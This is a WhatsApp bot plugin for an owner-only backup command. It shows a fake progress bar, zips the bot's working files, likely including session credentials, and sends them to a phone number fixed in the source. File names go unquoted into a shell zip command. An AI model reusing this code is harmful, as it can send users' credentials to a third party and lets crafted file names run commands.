import fs from 'fs'
import {execSync} from 'child_process'
import fetch from 'node-fetch'
let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
	let f = {
  key : {
  remoteJid: 'status@broadcast',
  participant : '0@s.whatsapp.net'
  },
  message: {
  documentMessage: {
  title: 'B A C K U P - B O T', 
  jpegThumbnail: await (await fetch(`https://i.ibb.co/M5zdTWt/20221025-115823.jpg`)).buffer(),
                            }
                          }
                        }
	let d = new Date
            let date = d.toLocaleDateString('id', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            })
            
            
            
            let loadd = [
  '[ > ][□□□□□□□□□□] 0%',
    '[ >> ][■□□□□□□□□□] 10%',
    '[ >>> ][■■□□□□□□□□] 20%',
    '[ > ][■■■□□□□□□□] 30%',
    '[ >> ][■■■■□□□□□□] 40%',
    '[ >>> ][■■■■■□□□□□] 50%',
    '[ > ][■■■■■■□□□□] 60%',
    '[ >> ][■■■■■■■□□□] 70%',
    '[ >>> ][■■■■■■■■□□] 80%',
    '[ > ][■■■■■■■■■□] 90%',
    '[ >> ][■■■■■■■■■■] 100%',
    '[ >>> ] Proses Complate!...',
    `*🗓️ Backup Bot:* ${date}`
 ]

let { key } = await conn.sendMessage(m.chat, {text: '_Loading_'})//Pengalih isu

for (let i = 0; i < loadd.length; i++) {
await conn.relayMessage(m.chat, {
      protocolMessage: {
        key: key,
        type: 14,
        editedMessage: {
          conversation: loadd[i]
        }
      }
    }, {})}            
    let nomorown = "6282112080081"
    await conn.sendMessage(m.chat, {
          react: {
            text: '✅',
            key: m.key,
          }})
    await m.reply("Data Bot Succes Di Backup")
    await conn.reply(nomorown + '@s.whatsapp.net', `*🗓️ Backup Bot:* ${date}`, null)
        const ls = (await execSync('ls')).toString().split('\n').filter(pe => pe != 'node_modules' && pe != 'package-lock.json' && pe != 'baileys_store.json' && pe != 'test.js' && pe != 'kanaeru.json' && pe != 'jadibot' && pe != 'Dockerfile' && pe != 'tmp' && pe != 'temp' && pe != '')
        const exec = await execSync(`zip -r backup_bot.zip ${ls.join(' ')}`)
       // await conn.sendMessage(nomorown + '@s.whatsapp.net', {document: await fs.readFileSync('./backup_bot.zip'), mimetype: 'application/zip', fileName: 'backup_bot.zip'}, {quoted: f})
        await conn.sendMessage(nomorown + '@s.whatsapp.net', { document: await fs.readFileSync('./backup_bot.zip'), fileName: 'Backup Script Bot' + '.zip', mimetype: 'application/zip' }, { quoted: f })
        await execSync('rm -rf backup_bot.zip')
 }
 
 handler.help = ['backup2']
handler.tags = ['owner']
handler.command = /^(backup2)$/i
handler.owner = true

export default handler
